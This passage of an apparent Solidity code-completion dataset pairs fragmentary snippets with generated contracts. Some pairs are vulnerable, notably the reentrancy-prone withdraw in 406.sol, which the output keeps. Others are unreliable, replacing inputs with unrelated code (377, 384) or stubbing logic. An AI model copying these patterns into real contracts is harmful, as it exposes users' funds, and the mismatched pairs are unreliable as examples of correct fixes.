        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract YourContract {\n    IERC20 public tokenContract; // The token contract\n    uint256 public amount; // The amount to transfer\n    \n    constructor(IERC20 _tokenContract, uint256 _amount) {\n        tokenContract = _tokenContract;\n        amount = _amount;\n    }\n\n    function pullTokens() external {\n        require(tokenContract.transferFrom(msg.sender, address(this), amount), \"Token transfer failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "375.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Person{\n    string public FirstName;\n    string public LastName;\n}\n\ncontract Family{\n    Person[] public People;\n\n    function addPerson(Person person) public {\n        People.push(person);\n    }\n}\n\ncontract FamilyManager{\n    Family[] Families;\n\n    function AddFamily(Person[] memory people) public {\n        Family family = new Family();\n        for(uint x; x < people.length; x++) {\n            family.addPerson(people[x]);\n        }\n        Families.push(family);\n    }\n\n    function GetFamilies() public view returns (Family[] memory){\n        return Families;\n    }\n}\n\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\ncontract Person{\n    string public FirstName;\n    string public LastName;\n}\n\ncontract Family{\n    Person[] public People;\n\n    function addPerson(Person person) public {\n        People.push(person);\n    }\n}\n\ncontract FamilyManager{\n    Family[] Families;\n\n    function AddFamily(Person[] memory people) public {\n        Family family = new Family();\n        for(uint x; x < people.length; x++) {\n            family.addPerson(people[x]);\n        }\n        Families.push(family);\n    }\n\n    function GetFamilies() public view returns (Family[] memory){\n        return Families;\n    }\n}\n\n\n",
        "changed": 0
    },
    "376.sol": {
        "input": "pragma solidity ^0.8.6;\ncontract mycontract{\n\n    address owner;\n    string name;\n    bool visible;\n    uint16 count;\n\nconstructor () {\n    owner=msg.sender;    \n}\n\n    function changname (string memory _name) public returns (string memory){\n        if(msg.sender==owner){\n            name=_name;\n            return \"sucsesss\";\n        }else{\n            return \"acsess denid\";\n        }\n    }\n\n    function showname () view public returns(string memory){\n        return name;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.6;\ncontract mycontract{\n\n    address owner;\n    string name;\n    bool visible;\n    uint16 count;\n\nconstructor () {\n    owner=msg.sender;    \n}\n\n    function changname (string memory _name) public returns (string memory){\n        if(msg.sender==owner){\n            name=_name;\n            return \"sucsesss\";\n        }else{\n            return \"acsess denid\";\n        }\n    }\n\n    function showname () view public returns(string memory){\n        return name;\n    }\n}\n\n",
        "changed": 0
    },
    "377.sol": {
        "input": "const DEFAULT_COMPILER_SETTINGS = {\n  version: '0.8.8',\n}\n\nconst LOWEST_OPTIMIZER_COMPILER_SETTINGS = {\n  version: '0.6.0',\n  settings: {\n    evmVersion: 'istanbul',\n    optimizer: {\n      enabled: true,\n      runs: 1_000,\n    },\n    metadata: {\n      bytecodeHash: 'none',\n    },\n  },\n}\n\nsolidity: {\n    compilers: [DEFAULT_COMPILER_SETTINGS],\n    overrides: {\n      'contracts/MockV3Aggregator.sol': LOW_OPTIMIZER_COMPILER_SETTINGS,\n     \n    },\n  },\n\npragma solidity >=0.7.0 <0.9.0;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MockV3Aggregator {\n    uint256 public latestAnswer;\n\n    function updateAnswer(uint256 _latestAnswer) public {\n        latestAnswer = _latestAnswer;\n    }\n}\n\n",
        "changed": 0
    },
    "378.sol": {
        "input": "contract Parent {\n    uint256 public number; \n    uint256 internal otherNumber; \n    uint256 private anotherNumber; \n}\n      \ncontract Child is Parent {\n}\n\n\n",
        "output": "contract Parent {\n    uint256 public number; // Child can write, others can only read\n    uint256 internal otherNumber; // Child can write, others cannot read\n    uint256 private anotherNumber; // no other contract can read\n}\n      \ncontract Child is Parent {\n}\n\n",
        "changed": 0
    },
    "379.sol": {
        "input": "    constructor(){\n        require(owner == msg.sender);  \n        owner = msg.sender;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address public owner;\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function.\");\n        _;\n    }\n\n    constructor() public {\n        owner = msg.sender;\n    }\n}\n\n",
        "changed": 0
    },
    "380.sol": {
        "input": "contract YourToken is ERC721 {\n  ERC20 private immutable token;\n\n  constructor(ERC20 t) {\n    token = t;\n  }\n\n  function transferFrom(address _from, address _to, uint256 _tokenId) public payable {\n    token.transferFrom(_from, _to, 10);\n  }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "381.sol": {
        "input": "pragma solidity 0.8.21;\n\ncontract B {\n    constructor(address _permit, address _weth) {}\n}\n\ncontract C {\n    constructor(address _weth) {}\n}\n\ncontract A is B, C {\n    address public weth;\n\n    constructor(address _weth, address _permit)\n        B(_permit, _weth)\n        C(_weth)\n    {\n        weth = _weth;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract B {\n    address permit;\n    address weth;\n\n    constructor(address _permit, address _weth) {\n        permit = _permit;\n        weth = _weth;\n    }\n}\n\ncontract C {\n    address weth;\n\n    constructor(address _weth) {\n        weth = _weth;\n    }\n}\n\n",
        "changed": 0
    },
    "382.sol": {
        "input": "function foo(uint8 version) public {\n    if (version == 1) {\n    } else if (version == 2) {\n    } else {\n        revert();\n    }\n}\n\nfunction fooYul(uint8 version) public {\n    assembly {\n        switch version\n        case 1 {\n        }\n        case 2 {\n        }\n        default {\n            revert(0, 0)\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FooContract {\n\n    function foo(uint8 version) public {\n        if (version == 1) {\n            // Code for version 1\n        } else if (version == 2) {\n            // Code for version 2\n        } else {\n            revert();\n        }\n    }\n\n    function fooYul(uint8 version) public {\n        assembly {\n            switch version\n            case 1 {\n                // Code for version 1\n            }\n            case 2 {\n                // Code for version 2\n            }\n            default {\n                revert(0, 0)\n            }\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "383.sol": {
        "input": "contract MyToken is ERC20, AccessControl {\n    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN_ROLE\");\n    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\");\n    bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\");\n\n    constructor() ERC20(\"MyToken\", \"TKN\") {\n        _setupRole(ADMIN_ROLE, msg.sender);\n    }\n\n    function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {\n        _mint(to, amount);\n    }\n\n    function burn(address from, uint256 amount) public onlyRole(BURNER_ROLE) {\n        _burn(from, amount);\n    }\n\n    function setupMinter(address minter, bool enabled) external onlyRole(ADMIN_ROLE) {\n        require(minter != address(0), \"!minter\");\n        if (enabled) _setupRole(MINTER_ROLE, minter);\n        else _revokeRole(MINTER_ROLE, minter);   \n    }\n\n    function setupBurner(address burner, bool enabled) external onlyRole(ADMIN_ROLE) {\n        require(burner != address(0), \"!burner\");\n        if (enabled) _setupRole(BURNER_ROLE, burner);\n        else _revokeRole(BURNER_ROLE, burner);   \n    }    \n\n    function isMinter(address minter) external view returns(bool) {\n        return hasRole(MINTER_ROLE, minter);\n    }\n\n    function isBurner(address burner) external view returns(bool) {\n        return hasRole(BURNER_ROLE, burner);\n    }    \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "384.sol": {
        "input": "module.exports = {\n  solidity: \"0.8.4\",\n  networks: {\n    ropsten: {\n      url: process.env.REACT_APP_RINKEBY_RPC_URL\n      accounts: [process.env.REACT_APP_PRIVATE_KEY],\n    },\n  },\n  etherscan: {\n    apiKey: process.env.REACT_APP_ETHERSCAN_KEY,\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    uint256 private data;\n\n    function set(uint256 x) public {\n        data = x;\n    }\n\n    function get() public view returns (uint256) {\n        return data;\n    }\n}\n\n",
        "changed": 0
    },
    "385.sol": {
        "input": "mapping (address=>uint256) lastUpdated;\n\nlastUpdated = block.timestamp;\n\nfunction removeTokenFromInactiveAccount(address inactiveUser, address transferTo) public {\n  require(block.timestamp > lastUpdated[inactiveUser]+inactivePeriod, \"Inactive period threshold not reached\");\n  transferFrom(inactiveUser, transferTo, balanceOf(inactiveUser));\n}\n\n_allowed[owner][this(address)] = \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract InactiveAccountHandler {\n    uint256 public inactivePeriod;\n    address public owner;\n    \n    mapping (address => uint256) public lastUpdated;\n    mapping (address => mapping (address => uint256)) private _allowed;\n    \n    \n    constructor(uint256 _inactivePeriod) public {\n        owner = msg.sender;\n        inactivePeriod = _inactivePeriod;\n    }\n    \n    function setLastUpdated(address user) public {\n        require(msg.sender == owner, \"Only owner can update last active timestamp\");\n        lastUpdated[user] = block.timestamp;\n    }\n    \n    function removeTokenFromInactiveAccount(address inactiveUser, address transferTo) public {\n        require(block.timestamp > lastUpdated[inactiveUser]+inactivePeriod, \"Inactive period threshold not reached\");\n        transferFrom(inactiveUser, transferTo, balanceOf(inactiveUser));\n    }\n    \n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\n        require(value <= _allowed[from][msg.sender], \"Insufficient allowance\");\n        _allowed[from][msg.sender] -= value;\n        // You must implement your own logic for how to handle transfers\n        return true;\n    }\n    \n    function balanceOf(address user) public view returns (uint256) {\n        // You must implement your own logic for how to handle balance checks\n        return 0;\n    }\n    \n    function approve(address spender, uint256 value) public returns (bool) {\n        _allowed[msg.sender][spender] = value;\n        return true;\n    }\n    \n    function allowance(address owner, address spender) public view returns (uint256) {\n        return _allowed[owner][spender];\n    }\n}\n\n",
        "changed": 0
    },
    "386.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address[3] addresses; \n    uint256 number; \n\n    constructor(address[2] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    \n    address[] addresses;\n\n    uint256 number;\n\n    constructor(address[] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address[3] public addresses; \n    uint256 public number; \n\n    constructor(address[3] memory _addresses, uint256 _number) {\n        addresses = _addresses;\n        number = _number;\n    }\n}\n\n",
        "changed": 0
    },
    "387.sol": {
        "input": "     address payable owner;\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract MyContract {\n    address payable owner;\n\n    // Contract constructor\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    // Function to withdraw funds\n    function withdraw() public {\n        require(msg.sender == owner, \"Only the contract owner can withdraw\");\n        owner.transfer(address(this).balance);\n    }\n\n    // Fallback function to receive funds\n    receive() external payable {}\n\n    // Function to check contract balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n",
        "changed": 0
    },
    "388.sol": {
        "input": "pragma solidity >0.4.23 <0.7.0;\n\ncontract Fundraiser{\n    string public name;\n\n    constructor(string memory _name)public{\n        name = _name;\n}\n\ncontract Fundraiser{\n    string public name;\n\n    constructor(string memory _name)public{\n        name = _name;\n    } \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Fundraiser {\n    string public name;\n\n    constructor(string memory _name) public {\n        name = _name;\n    } \n}\n\n",
        "changed": 1
    },
    "389.sol": {
        "input": "mapping(address => uint256[]) private _ownedTokens;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TokenOwnership {\n\n    mapping(address => uint256[]) private _ownedTokens;\n\n    function addToken(address _owner, uint256 _tokenId) public {\n        _ownedTokens[_owner].push(_tokenId);\n    }\n\n    function removeToken(address _owner, uint256 _tokenId) public {\n        uint256[] storage ownerTokens = _ownedTokens[_owner];\n        for (uint256 i = 0; i < ownerTokens.length; i++) {\n            if (ownerTokens[i] == _tokenId) {\n                ownerTokens[i] = ownerTokens[ownerTokens.length - 1];\n                ownerTokens.pop();\n                break;\n            }\n        }\n    }\n\n    function tokensOfOwner(address _owner) public view returns(uint256[] memory) {\n        return _ownedTokens[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "390.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Test {\n    uint[2] votes = [0,0];\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You're not the owner!\");\n        _;\n    }\n\n    function vote_a() public{\n        votes[0] += 1;\n    }\n\n    function vote_b() public{\n        votes[1] += 1;\n    }\n\n    function results() public view returns(string memory){\n        uint a = votes[0];\n        uint b = votes[1];\n        \n        if (a==b)\n            return \"tie\";\n        else if (a>b)\n            return \"a wins\";\n        else\n            return \"b wins\";\n    }\n\n    function setResults() public onlyOwner {\n        votes[0] = 0;\n        votes[1] = 0;\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Test {\n    uint[2] votes = [0,0];\n    address owner;\n\n    // NOTE: I set a 'owner' variable with the address value who have deployed for the first time the smart contract\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // NOTE: Modifier that allow only for smart contract owner the access to specific function\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"You're not the owner!\");\n        _;\n    }\n\n    function vote_a() public{\n        votes[0] += 1;\n    }\n\n    function vote_b() public{\n        votes[1] += 1;\n    }\n\n    function results() public view returns(string memory){\n        uint a = votes[0];\n        uint b = votes[1];\n        \n        if (a==b)\n            return \"tie\";\n        else if (a>b)\n            return \"a wins\";\n        else\n            return \"b wins\";\n    }\n\n    // NOTE: I created a new function that allows you to handle the data inside array\n    function setResults() public onlyOwner {\n        votes[0] = 0;\n        votes[1] = 0;\n    }\n\n}\n\n",
        "changed": 0
    },
    "391.sol": {
        "input": "receiver.transfer(msg.value);  \n\nreceiver.transfer(address(this).balance);  \n\npragma solidity ^0.8.4;\n\ncontract ActualBank{\nuint minAccountBalance=1 ether;\naddress payable owner;\nmapping(address => uint256) balance ;\nmapping(address => uint256) secretKey;\n\nconstructor(){\n    owner=payable(msg.sender);\n}\n\nfunction openAccount(uint256 _secretKey) payable public returns(uint256) {\n    require(msg.value >= minAccountBalance,\"There must a minimum balance of 1 ether\");\n    balance[msg.sender]+=msg.value;\n    secretKey[msg.sender]=_secretKey;\n    return balance[msg.sender];\n}\nfunction withDraw(uint256 _secretKey) payable public returns(uint256) {\n    require(address(this).balance >= balance[msg.sender],\"With drawal value not correct\");\n    require(secretKey[msg.sender] == _secretKey, \"Secret key didn't matched\");\n    balance[msg.sender] = 0;\n    address payable receiver= payable(msg.sender);\n    receiver.transfer(address(this).balance);  \n    return balance[msg.sender];\n}\nfunction getAccountBalance() public view returns(uint256){\n    return balance[msg.sender];\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ActualBank {\n    uint minAccountBalance = 1 ether;\n    address payable owner;\n    mapping(address => uint256) private balance;\n    mapping(address => uint256) private secretKey;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function openAccount(uint256 _secretKey) public payable returns(uint256) {\n        require(msg.value >= minAccountBalance,\"There must be a minimum balance of 1 ether\");\n        balance[msg.sender] += msg.value;\n        secretKey[msg.sender] = _secretKey;\n        return balance[msg.sender];\n    }\n\n    function withDraw(uint256 _secretKey) public returns(uint256) {\n        require(balance[msg.sender] > 0,\"Withdrawal value not correct\");\n        require(secretKey[msg.sender] == _secretKey, \"Secret key didn't match\");\n        uint256 amount = balance[msg.sender];\n        balance[msg.sender] = 0;\n        address payable receiver = payable(msg.sender);\n        receiver.transfer(amount);  \n        return balance[msg.sender];\n    }\n\n    function getAccountBalance() public view returns(uint256){\n        return balance[msg.sender];\n    }\n}\n\n",
        "changed": 0
    },
    "392.sol": {
        "input": "contract A {\n    uint256 arrSize;\n    constructor(uint256 _size){\n        arrSize = _size;\n    }\n\n    function giveMeAnArray() public pure returns (uint256[]){\n        uint256[arrSize] memory arr; \n        uint256[] memory arr = new uint256[](arrSize); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    uint256 public arrSize;\n    \n    constructor(uint256 _size) public {\n        arrSize = _size;\n    }\n\n    function giveMeAnArray() public view returns (uint256[] memory){\n        uint256[] memory arr = new uint256[](arrSize); \n        for(uint i=0; i<arrSize; i++){\n            arr[i] = i+1; // or some other logic to fill array\n        }\n        return arr;\n    }\n}\n\n",
        "changed": 0
    },
    "393.sol": {
        "input": "function getOngoingSales() public view returns(Sale[] memory) {\n    Sale[] memory _ongoingSales;\n\n    for(uint i = 0; i<sales.length; i++) {\n        if (sales[i].ended == false) _ongoingSales.push(sales[i]);\n    }\n\n    return _ongoingSales;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SaleContract {\n\n    struct Sale {\n        string item;\n        uint price;\n        bool ended;\n    }\n\n    Sale[] public sales;\n\n    function getOngoingSales() public view returns(Sale[] memory) {\n        uint ongoingSaleCount = 0;\n        for(uint i = 0; i<sales.length; i++) {\n            if (sales[i].ended == false) ongoingSaleCount++;\n        }\n\n        Sale[] memory _ongoingSales = new Sale[](ongoingSaleCount);\n        uint index = 0;\n        for(uint i = 0; i<sales.length; i++) {\n            if (sales[i].ended == false) {\n                _ongoingSales[index] = sales[i];\n                index++;\n            }\n        }\n\n        return _ongoingSales;\n    }\n\n    function createSale(string memory _item, uint _price) public {\n        Sale memory newSale = Sale({\n            item: _item,\n            price: _price,\n            ended: false\n        });\n\n        sales.push(newSale);\n    }\n\n    function endSale(uint _saleIndex) public {\n        require(_saleIndex < sales.length, \"Sale index out of range.\");\n        sales[_saleIndex].ended = true;\n    }\n}\n\n",
        "changed": 0
    },
    "394.sol": {
        "input": "function mint(uint256 _mintAmount) public payable mintCompliance(_mintAmount) mintPriceCompliance(_mintAmount) {\n    require(!paused, 'The contract is paused!');\n\n    _safeMint(_msgSender(), _mintAmount);\n\n   payable(owner()).transfer(msg.value);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "395.sol": {
        "input": "\n    \n    function oracleRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        address callbackAddress,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external override validateFromLINK validateIsAuthorizedConsumer(sender) {\n        revert(\"use the operatorRequest only\");\n    }\n\n    \n    function operatorRequest(\n        address sender,\n        uint256 payment,\n        bytes32 specId,\n        bytes4 callbackFunctionId,\n        uint256 nonce,\n        uint256 dataVersion,\n        bytes calldata data\n    ) external override validateIsAuthorizedConsumer(sender) validateFromLINK {\n        (\n            bytes32 requestId,\n            uint256 expiration\n        ) = _verifyAndProcessOracleRequest(\n                sender,\n                payment,\n                sender,\n                callbackFunctionId,\n                nonce,\n                dataVersion\n            );\n        emit OracleRequest(\n            specId,\n            sender,\n            requestId,\n            payment,\n            sender,\n            callbackFunctionId,\n            expiration,\n            dataVersion,\n            data\n        );\n    }\n\n\n    \n    function setAuthorizedConsumer(address _consumer) public onlyOwner {\n        require(\n            authorizedConsumer == address(0),\n            \"authorized consumer is already set\"\n        );\n        authorizedConsumer = _consumer;\n    }\n\n    \n    function _validateIsAuthorizedConsumer(address _consumer) internal view {\n        require(_consumer == authorizedConsumer, \"Not authorized sender\");\n    }\n\n    \n    modifier validateIsAuthorizedConsumer(address _consumer) {\n        _validateIsAuthorizedConsumer(_consumer);\n        _;\n    }\n\n\n\n\n",
        "output": "",
        "changed": 0
    },
    "396.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"https:\nimport \"https:\n\ncontract Mycontract is ERC20 {\n\naddress public oracle = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n.....\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "397.sol": {
        "input": "address payable[1000] memory winners;\n\nwinners[j].transfer(...);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lottery {\n    address payable[1000] winners;\n    uint256 public j;\n    \n    constructor() {\n        j = 0; // initialize j to 0\n    }\n    \n    // function to add winners\n    function addWinner(address payable winner) public {\n        require(j < 1000, \"No more winners can be added\"); // Ensure not more than 1000 winners\n        winners[j] = winner;\n        j++;\n    }\n\n    // function to distribute prize\n    function distributePrize(uint256 amount) public {\n        require(j > 0, \"No winners to distribute prize to\"); // Ensure there is at least one winner\n        require(amount > 0, \"Prize amount should be more than 0\"); // Ensure prize amount is more than 0\n        winners[j-1].transfer(amount); // Transfer prize to the last added winner\n    }\n\n    // function to deposit ether into contract\n    function deposit() public payable {\n        require(msg.value > 0, \"Deposit amount should be more than 0\"); // Ensure deposit amount is more than 0\n    }\n\n    // function to check contract balance\n    function getBalance() public view returns (uint256) {\n        return address(this).balance; // Return contract balance\n    }\n    \n    // fallback function to accept ether\n    fallback() external payable { }\n}\n\n",
        "changed": 1
    },
    "398.sol": {
        "input": "function issue(uint amount) public onlyOwner {\n    require(_totalSupply + amount > _totalSupply);\n    require(balances[owner] + amount > balances[owner]);\n\n    balances[owner] += amount;\n    _totalSupply += amount;\n    Issue(amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    // Mapping from address of account to the balance;\n    mapping(address => uint256) public balances;\n\n    // Total supply of the token\n    uint256 private _totalSupply;\n\n    // Owner of the account\n    address private owner;\n\n    // Event to notify when tokens are issued\n    event Issue(uint256 amount);\n\n    // Modifiers\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Caller is not the owner\");\n        _;\n    }\n\n    // Constructor\n    constructor() public {\n        owner = msg.sender;\n        _totalSupply = 1000000; // Initial total supply\n        balances[owner] = _totalSupply; // Assigning all tokens to owner initially\n    }\n\n    function issue(uint256 amount) public onlyOwner {\n        require(_totalSupply + amount > _totalSupply, \"Total supply overflow\");\n        require(balances[owner] + amount > balances[owner], \"Owner balance overflow\");\n\n        balances[owner] += amount;\n        _totalSupply += amount;\n        emit Issue(amount);\n    }\n\n    // Additional functions to interact with the token\n    function balanceOf(address account) public view returns (uint256) {\n        return balances[account];\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n}\n\n",
        "changed": 1
    },
    "400.sol": {
        "input": " balance += Wallet[walletNumbers[msg.sender][i]].balance;\n\n        balance += walletInfo[walletNumbers[msg.sender][i]].balance;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WalletContract {\n    struct Wallet {\n        uint balance;\n    }\n\n    mapping(address => Wallet[]) public walletNumbers;\n    mapping(address => Wallet[]) public walletInfo;\n\n    function getBalance() public view returns (uint) {\n        uint balance = 0;\n        for (uint i = 0; i < walletNumbers[msg.sender].length; i++) {\n            balance += walletNumbers[msg.sender][i].balance;\n        }\n        for (uint i = 0; i < walletInfo[msg.sender].length; i++) {\n            balance += walletInfo[msg.sender][i].balance;\n        }\n        return balance;\n    }\n\n    function addWallet(uint _balance) public {\n        Wallet memory newWallet = Wallet(_balance);\n        walletNumbers[msg.sender].push(newWallet);\n        walletInfo[msg.sender].push(newWallet);\n    }\n}\n\n",
        "changed": 0
    },
    "401.sol": {
        "input": "function isArrayEven() public view returns(bool[] memory) {\n    bool[] memory ret = new bool[](arr.length);\n\n    for (uint i = 0; i < arr.length; i++) {\n        ret[i] = bool((arr[i]%2 == 0));\n    }\n\n    return ret;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract EvenArray {\n    \n    uint[] public arr;\n\n    constructor(uint[] memory _arr) {\n        arr = _arr;\n    }\n\n    function isArrayEven() public view returns(bool[] memory) {\n        bool[] memory ret = new bool[](arr.length);\n\n        for (uint i = 0; i < arr.length; i++) {\n            ret[i] = bool((arr[i]%2 == 0));\n        }\n\n        return ret;\n    }\n}\n\n",
        "changed": 0
    },
    "402.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n    }\n\n    function getCurrentStatusVerbose() external view returns (string memory) {\n        if (currentStatus == Status.Vacant) {\n            return \"The current status is Vacant\";\n        } else if (currentStatus == Status.Occupied) {\n            return \"The current status is Occupied\";\n        }\n    }\n}\n\npragma solidity ^0.8;\n\ncontract MyContract {\n    event Occupy(address _occupant, uint _value);\n\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n        emit Occupy(msg.sender, uint(_currentStatus));\n    }\n}\n\nmyContract.on('Occupy', async (event) => {\n    updateOccupancyInExternalDB(event);\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event Occupy(address _occupant, uint _value);\n\n    enum Status {\n        Vacant,\n        Occupied\n    }\n\n    Status public currentStatus;\n\n    function setCurrentStatus(Status _currentStatus) external {\n        currentStatus = _currentStatus;\n        emit Occupy(msg.sender, uint(_currentStatus));\n    }\n\n    function getCurrentStatusVerbose() external view returns (string memory) {\n        if (currentStatus == Status.Vacant) {\n            return \"The current status is Vacant\";\n        } else if (currentStatus == Status.Occupied) {\n            return \"The current status is Occupied\";\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "404.sol": {
        "input": "IERC20(WETH).approve(address(this), balanceWETH);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    address public WETH;\n\n    constructor(address _WETH) public {\n        WETH = _WETH;\n    }\n\n    function approveWETH() public {\n        uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));\n        IERC20(WETH).approve(address(this), balanceWETH);\n    }\n}\n\n",
        "changed": 0
    },
    "405.sol": {
        "input": "function step() public virtual;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    event StepEvent(address indexed user, uint256 stepCount);\n\n    uint256 public stepCount;\n\n    constructor() {\n        stepCount = 0;\n    }\n\n    function step() public virtual {\n        stepCount++;\n        emit StepEvent(msg.sender, stepCount);\n    }\n}\n\n",
        "changed": 0
    },
    "406.sol": {
        "input": "\nmapping(address => uint256) public balance;\n\nfunction deposit() external payable {\n  balance[msg.sender] += msg.value;\n}\n\nfunction withdraw() external {\n  msg.sender.call{value: balance[msg.sender]}(\"\"); \n  balance[msg.sender] == 0; \n}\n\nfunction withdrawV2(uint256 value) external {\n  require(value <= balance[msg.sender], \"you don't have that much\"); \n  msg.sender.call{value: balance[msg.sender]}(\"\");\n  unchecked { \n    balance[msg.sender] -= value;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Bank {\n    mapping(address => uint256) public balance;\n\n    function deposit() external payable {\n        balance[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        require(balance[msg.sender] > 0, \"You have no balance to withdraw\");\n        (bool success, ) = msg.sender.call{value: balance[msg.sender]}(\"\");\n        require(success, \"Transfer failed\");\n        balance[msg.sender] = 0; \n    }\n\n    function withdrawV2(uint256 value) external {\n        require(value <= balance[msg.sender], \"You don't have that much\"); \n        (bool success, ) = msg.sender.call{value: value}(\"\");\n        require(success, \"Transfer failed\");\n        unchecked { \n            balance[msg.sender] -= value;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "407.sol": {
        "input": "function _burn(address account, uint256 value) internal {\n    require(account != address(0));\n\n    _totalSupply = _totalSupply.sub(value);\n    _balances[account] = _balances[account].sub(value);\n    emit Transfer(account, address(0), value);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "408.sol": {
        "input": "_setTokenURI(newItemId, string(abi.encodePacked(_uri, '/', newItemId.toString(), '.json')));\n\n\n",
        "output": "",
        "changed": 0
    },
    "409.sol": {
        "input": "contract Greeter {\n\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "contract Greeter {\n    // ...\n\n    receive() external payable {\n    }\n}\n\n",
        "changed": 0
    },
    "410.sol": {
        "input": "require( aaveLendingPool.withdraw(\n                address(dai),\n                amount,\n                msg.sender), \"Error, contract does not have enough DAI\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IAaveLendingPool {\n    function withdraw(\n        address asset,\n        uint256 amount,\n        address onBehalfOf\n    ) external returns (uint256);\n}\n\ncontract MyContract {\n    IAaveLendingPool public aaveLendingPool;\n    address public dai;\n\n    constructor(address _aaveLendingPool, address _dai) {\n        aaveLendingPool = IAaveLendingPool(_aaveLendingPool);\n        dai = _dai;\n    }\n\n    function withdraw(uint256 amount) public {\n        require(\n            aaveLendingPool.withdraw(\n                address(dai),\n                amount,\n                msg.sender\n            ) > 0,\n            \"Error, contract does not have enough DAI\"\n        );\n    }\n}\n\n",
        "changed": 0
    },
    "411.sol": {
        "input": "pragma solidity 0.8;\n\nimport \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\";\n\ncontract MyContract {\n    AggregatorV3Interface priceFeed;\n    uint256 requiredPriceInUsd = 1000 * 1e18;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419);\n    }\n\n    function getRequiredPriceInWei() public view returns (uint256) {\n        (,int answer,,,) = priceFeed.latestRoundData();\n\n        uint256 ethUsdPrice = uint256(answer) * 1e10;\n\n        return (requiredPriceInUsd * 1e18) / ethUsdPrice;\n    }\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "413.sol": {
